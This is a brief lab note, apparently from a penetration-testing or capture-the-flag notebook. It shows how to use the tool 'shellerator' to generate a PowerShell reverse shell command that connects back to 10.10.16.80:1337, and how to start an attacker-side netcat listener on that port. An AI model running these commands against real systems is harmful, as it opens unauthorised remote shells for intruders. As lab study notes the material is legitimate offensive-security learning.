- `shellerator` can be used to generate a reverse shell command dynamically
```bash
shellerator --reverse-shell --lhost "10.10.16.80" --lport 1337 --type powershell

#ATTACKER
 rlwrap nc -lvnp 1337
```
![[Pasted image 20250826205243.png]]
